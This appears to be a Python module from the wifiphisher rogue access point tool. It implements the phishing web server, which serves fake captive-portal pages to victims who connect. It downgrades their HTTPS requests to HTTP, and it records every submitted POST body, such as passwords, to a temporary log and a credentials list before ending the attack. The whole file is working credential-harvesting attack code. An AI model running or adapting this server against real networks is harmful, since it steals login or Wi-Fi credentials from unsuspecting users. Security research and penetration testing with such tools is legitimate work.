import tornado.ioloop
import tornado.web
import os.path
import logging
hn = logging.NullHandler()
hn.setLevel(logging.DEBUG)
logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True
from wifiphisher.common.constants import *

template = False
terminate = False
creds = []


class DowngradeToHTTP(tornado.web.RequestHandler):

    def get(self):
        self.redirect("http://10.0.0.1:8080/")


class CaptivePortalHandler(tornado.web.RequestHandler):

    def get(self):
        """
        Override the get method

        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        """

        requested_file = self.request.path[1:]
        template_directory = template.get_path()

        # choose the correct file to serve
        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        # load the file
        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())

        log_file_path = "/tmp/wifiphisher-webserver.tmp"
        with open(log_file_path, "a+") as log_file:
            log_file.write("[{0}*{1}]{2} GET {1} request from {0}{3}{1} for {0}{4}{1}\n".format(
                T, W, O, self.request.remote_ip, self.request.full_url()))

    def post(self):
        """
        Override the post method

        :param self: A tornado.web.RequestHandler object
        :type self: tornado.web.RequestHandler
        :return: None
        :rtype: None
        """

        global terminate
        post_data = tornado.escape.url_unescape(self.request.body)

        # log the data
        log_file_path = "/tmp/wifiphisher-webserver.tmp"
        with open(log_file_path, "a+") as log_file:
            log_file.write("[{0}*{1}] {2}POST{1} request from {0}{3}{1} with {0}{4}{1}\n".format(
                T, W, O, self.request.remote_ip, post_data))

        creds.append(post_data)
        terminate = True


def runHTTPServer(ip, port, ssl_port, t):
    global template
    template = t
    app = tornado.web.Application(
        [
            (r"/.*", CaptivePortalHandler)
        ],
        template_path=template.get_path(),
        static_path=template.get_path_static(),
        compiled_template_cache=False
    )
    app.listen(port, address=ip)

    ssl_app = tornado.web.Application(
        [
            (r"/.*", DowngradeToHTTP)
        ]
    )
    https_server = tornado.httpserver.HTTPServer(ssl_app, ssl_options={
        "certfile": PEM,
        "keyfile": PEM,
    })
    https_server.listen(ssl_port, address=ip)

    tornado.ioloop.IOLoop.instance().start()
